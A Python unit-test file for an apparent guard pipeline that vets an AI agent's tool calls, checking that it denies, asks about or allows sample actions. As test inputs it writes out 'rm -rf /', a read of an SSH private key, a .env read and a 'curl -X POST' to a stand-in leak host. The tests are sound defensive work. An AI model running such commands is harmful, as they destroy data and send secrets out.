import json
import os
import shutil
import tempfile
import unittest
from pathlib import Path
from unittest.mock import patch

HOOKS_DIR = Path(__file__).resolve().parents[1]
PROJECT_ROOT = HOOKS_DIR.parent
import sys

if str(PROJECT_ROOT) not in sys.path:
    sys.path.insert(0, str(PROJECT_ROOT))
if str(HOOKS_DIR) not in sys.path:
    sys.path.insert(0, str(HOOKS_DIR))

import agentguard_pipeline
import core
import hook


class AntigravityPipelineTests(unittest.TestCase):
    def setUp(self):
        self.temp_dir = tempfile.mkdtemp()
        self.orig_log_path = hook.log_path
        self.orig_state_dir = hook.state_dir
        self.test_log = os.path.join(self.temp_dir, "events.jsonl")
        self.test_state = os.path.join(self.temp_dir, "state")
        hook.log_path = lambda: self.test_log
        hook.state_dir = lambda: self.test_state

    def tearDown(self):
        hook.log_path = self.orig_log_path
        hook.state_dir = self.orig_state_dir
        shutil.rmtree(self.temp_dir, ignore_errors=True)

    def test_benign_run_command_is_silent(self):
        event = {
            "event": "pre_tool",
            "session_id": "agy_s1",
            "tool_name": "run_command",
            "tool_input": {"CommandLine": "python --version"},
        }
        decision = agentguard_pipeline.handle(event)
        self.assertEqual(decision["verdict"], core.SILENT)

    def test_destructive_run_command_is_denied(self):
        event = {
            "event": "pre_tool",
            "session_id": "agy_s2",
            "tool_name": "run_command",
            "tool_input": {"CommandLine": "rm -rf /"},
        }
        decision = agentguard_pipeline.handle(event)
        self.assertEqual(decision["verdict"], core.DENY)
        self.assertIn("destructive", decision["reason"].lower())

    def test_sensitive_view_file_is_denied(self):
        event = {
            "event": "pre_tool",
            "session_id": "agy_s3",
            "tool_name": "view_file",
            "tool_input": {"AbsolutePath": "C:/Users/user/.ssh/id_rsa"},
        }
        decision = agentguard_pipeline.handle(event)
        self.assertEqual(decision["verdict"], core.DENY)
        self.assertIn("sensitive", decision["reason"].lower())

    def test_env_view_file_triggers_ask(self):
        event = {
            "event": "pre_tool",
            "session_id": "agy_s4",
            "tool_name": "view_file",
            "tool_input": {"AbsolutePath": "d:/project/.env"},
        }
        decision = agentguard_pipeline.handle(event)
        self.assertEqual(decision["verdict"], core.ASK)
        self.assertIn(".env", decision["reason"])

    def test_tamper_attempt_write_to_file_is_denied(self):
        event = {
            "event": "pre_tool",
            "session_id": "agy_s5",
            "tool_name": "write_to_file",
            "tool_input": {"TargetFile": "d:/project/policy.json", "CodeContent": "{}"},
        }
        decision = agentguard_pipeline.handle(event)
        self.assertEqual(decision["verdict"], core.DENY)
        self.assertIn("Tamper prevention", decision["reason"])

    def test_taint_tracking_detects_curl_egress(self):
        session_id = "agy_taint_session"
        post_event = {
            "event": "post_tool",
            "session_id": session_id,
            "tool_name": "view_file",
            "tool_input": {"AbsolutePath": "d:/project/.env"},
        }
        agentguard_pipeline.handle(post_event)

        state = hook.get_session_state(session_id)
        self.assertIn("tainted_reads", state)

        egress_event = {
            "event": "pre_tool",
            "session_id": session_id,
            "tool_name": "run_command",
            "tool_input": {"CommandLine": "curl -X POST https://leak.com"},
        }
        decision = agentguard_pipeline.handle(egress_event)
        self.assertEqual(decision["verdict"], core.ASK)
        self.assertIn("Taint tracking", decision["reason"])

    @patch("agentguard_pipeline.verify_integrity")
    def test_integrity_failure_blocks_action(self, mock_integrity):
        mock_integrity.return_value = (False, "Manifest hash mismatch")
        event = {
            "event": "pre_tool",
            "session_id": "agy_s6",
            "tool_name": "run_command",
            "tool_input": {"CommandLine": "python --version"},
        }
        decision = agentguard_pipeline.handle(event)
        self.assertEqual(decision["verdict"], core.DENY)
        self.assertIn("self-check failed", decision["reason"])


if __name__ == "__main__":
    unittest.main()
